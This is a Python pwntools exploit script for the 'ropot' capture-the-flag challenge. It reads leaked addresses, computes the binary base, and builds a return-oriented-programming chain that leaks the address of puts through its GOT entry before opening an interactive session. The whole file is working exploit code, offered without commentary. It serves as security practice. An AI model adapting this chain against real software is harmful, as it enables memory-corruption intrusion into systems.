from pwn import *
target = process('./ropot')
#target = remote("chall.ctf.bamboofox.tw", 10100)
elf = ELF('./ropot')

def sa(s, d):
	print(target.sendafter(s, d))
def r(s):
	print(target.recvuntil(s))

r("Gift1: 0x")
ropchain = int(target.recvline().strip(), 0x10)
log.info("ROP chain: " + hex(ropchain))

r("Gift2: 0x")
main = int(target.recvline().strip(), 0x10)
elf_base = main - 0x138b
log.info("ELF Base: " + hex(elf_base))
#gdb.attach(target, '''set follow-fork-mode child
#		b *''' + hex(main + 0x693))
popRax = p64(main + 0x6c4)
popRcx = p64(main + 0x6c6)
popRdx = p64(main + 0x6c8)
popRdi = p64(main + 0x730)
ret = p64(main + 0x6c7)
popRsiR15 = p64(main + 0x72e)
buf = p64(ropchain + 13*8)
getRsp = p64(main + 0x693)	#mov rsp, rax ; xor all registers except rsp to make 0 ; ret

chain = ""
chain += ret * 0x100
#chain += popRax + p64(0) + popRdi + p64(6) + popRsiR15 + buf*2 + popRdx + buf + p64(elf_base + elf.plt['dprintf'])
chain += popRax + p64(0) + popRdi + p64(elf_base + elf.got['puts']) + p64(elf_base + elf.plt['puts'])
chain += "G\n"
sa("chain : ", chain)



target.interactive()
